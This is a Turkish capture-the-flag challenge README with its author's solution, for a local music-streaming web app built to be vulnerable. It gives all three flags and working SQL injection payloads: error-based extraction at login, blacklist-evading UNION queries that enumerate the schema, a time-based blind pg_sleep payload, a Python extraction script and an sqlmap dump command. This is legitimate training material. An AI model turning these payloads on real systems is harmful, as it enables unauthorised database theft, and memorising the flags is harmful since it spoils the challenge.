# Projeyi ayağa kaldırır (İlk kurulumda kullanılır)
sudo docker compose up --build

Sistem ayağa kalktıktan sonra tarayıcınızdan http://localhost:3000
adresine giderek soruya ulaşabilirsiniz.

Sorumuzda 3 flag olacak.

1. flag: SKYDAYS{y3t3r_4rt1k_sqld3n_b1kt1m}
2. flag: SKYDAYS{fl4g_1sm1_bul4m1y0rum}
3. flag: SKYDAYS{sp4t1fy_sp0t1fyd4n_d4h4_1y1}

**Soru Acıklaması:**

**Görevler:**
1. Görev: Metallica kullanıcısının passwordunu bulunuz.
2. Görev: SKYDAYS ekibinin daha yayınlanmamış gizli şarkısını sızdırın ve flagi bulun.
3. Görev: Sistemin tablolarındaki gizli flagi bulunuz.


**Soru çözümü:**


**1. FLAG  : SKYDAYS{y3t3r_4rt1k_sqld3n_b1kt1m}**
Login pageden error based sql injection açığı kullanılacak.
Payload:
`Metallica' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) -- `



**2. FLAG : SKYDAYS{fl4g_1sm1_bul4m1y0rum}**
Homepagede search kısmından is_released = FALSE olan şarkıları göstermemiz gerek. Ancak search kısmında blacklist koruması var boşluklar ve bazı kelimelere izin verilmiyor.
Ayrıca is_released kolonunu keşfetmemiz lazım.
Payloadlar:

Bu payloadlar search kısmına yazılacak.

Önce databaseden tablo ismini öğreniyoruz. ----->`abc%')/**/uNiOn/**/sElEcT/**/NULL,table_name,NULL,NULL,NULL/**/fRoM/**/iNfOrmAtIoN_sChEmA.tAbLeS/**/wHeRe/**/tAbLe_sChEmA='public'--`

Daha sonra buldugumuz "songs" tablosundaki kolon isimlerini öğreniyoruz ----->`abc%')/**/uNiOn/**/seLeCt/**/NULL,column_name,NULL,NULL,NULL/**/fRoM/**/infOrmation_schema.columns/**/wHeRe/**/table_name='songs'--`

Daha sonra "is_released" kolonunu FALSE yaparak gizli şarkıyı sızdırıyoruz ----->`abc%')/**/oR/**/is_released/**/=/**/FALSE--`

Buradan sızdırılan wav kaydını buluyoruz. Daha sonra bu kaydı online spectografi decode toollarına atarak flagi buluyoruz.

Örnek spectogram siteleri : 
`https://www.boxentriq.com/steganography/audio-spectrogram`
`https://audioalter.com/spectrogram`



**3. FLAG : SKYDAYS{sp4t1fy_sp0t1fyd4n_d4h4_1y1}**

Flag tablosundaki flag kolonunu okumalıyız.

Song upload kısmındaki isim sorgulama yerine time-based sql injection saldırısı yapacagız.(Boolean Based Saldırısı da yapılarak flag bulunabilir)

Payload:
Burp suite için payload:
`' AND (SELECT 'a' FROM pg_sleep(5) WHERE (SELECT substring(flag,1,1) FROM flag LIMIT 1)='S')='a`

Burp Suite kullanılarak flag çekilebilir , ayrıca python scriptleri yazılarak da flag çekilebilir.

Otomatize eden python Scripti:
---------------------------------------
```
import requests
import time

BASE_URL = "http://localhost:3000"
LOGIN_URL = f"{BASE_URL}/login"
TARGET_URL = f"{BASE_URL}/upload"

CREDENTIALS = {
    "username": "Metallica",
    "password": "SKYDAYS{y3t3r_4rt1k_sqld3n_b1kt1m}"
}

def pwn_spatify():
    session = requests.Session()
    print("🔑 Giriş yapiliyor...")
    session.post(LOGIN_URL, data=CREDENTIALS)
    
    flag = ""
    # Flag genelde 15-30 karakter arası olur
    for i in range(1, 40): 
        found = False
        # 32'den 126'ya kadar tüm ASCII karakterleri dene (Harfler, rakamlar, parantezler)
        for char_code in range(32, 127):
            # PAYLOAD AÇIKLAMASI:
            # 1. 'Katarakt' şarkısını bul.
            # 2. Flag'in i. karakterinin ASCII kodunu kontrol et.
            # 3. Doğruysa 3 saniye uyu.
            # 4. IS NULL ekledik çünkü pg_sleep 'void' döner, void her zaman null kabul edilebilir.
            payload = f"Katarakt' AND (SELECT CASE WHEN (ascii(SUBSTRING((SELECT flag FROM flag LIMIT 1),{i},1))={char_code}) THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL AND '1'='1"
            
            data = {
                "songName": payload,
                "action": "check"
            }

            start = time.time()
            try:
                # 10 saniye bekliyoruz ki uykuya daldığında bağlantı kopmasın
                session.post(TARGET_URL, data=data, timeout=10)
                elapsed = time.time() - start

                if elapsed >= 3:
                    flag += chr(char_code)
                    print(f"🚩 [{i}]. Karakter: {chr(char_code)} | Mevcut Flag: {flag}")
                    found = True
                    break
            except:
                continue
        
        if not found:
            print("\n✅ Tarama bitti.")
            break

    print(f"\n🏁 FINAL: {flag}")

if __name__ == "__main__":
    pwn_spatify()
```
Ayrıca sqlmap çözümü: sqlmap -u "http://localhost:3000/upload" --data="songName=Katarakt&action=check" --method=POST --cookie="connect.sid=COOKIE_DEGERIN" --dbms=postgresql --level=5 --risk=3 -T flag -C flag --dump --batch

---------------------------------------------
**NOT**:Her input sanitize edilmiştir mesela login pageden flag tablosuna erişim kısıtlanmıştır bu yüzden yarısmacılar 3. flag için time-based sql kullanması gerekir

